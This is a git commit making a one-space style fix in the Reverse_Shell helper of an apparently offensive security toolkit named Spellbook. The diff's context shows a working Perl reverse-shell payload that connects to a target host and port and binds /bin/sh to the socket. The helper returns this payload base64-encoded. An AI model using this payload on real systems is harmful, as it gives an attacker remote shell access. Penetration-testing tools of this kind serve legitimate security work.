b9105dab5f1bc8bf1ef0c87ef0cd03f7d4c87e4c
htrgouvea <hi@heitorgouvea.me>
2023-07-29 19:36:39 -0300

    fix style code

--- lib/Spellbook/Helper/Reverse_Shell.pm
+++ lib/Spellbook/Helper/Reverse_Shell.pm
@@ -24,7 +24,7 @@ package Spellbook::Helper::Reverse_Shell {
                 "perl" => "perl -e 'use Socket;\$i=\"$target\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
             };
 
-            return encode_base64( $payloads -> {$lang});
+            return encode_base64($payloads -> {$lang});
         }
 
         if ($help) {
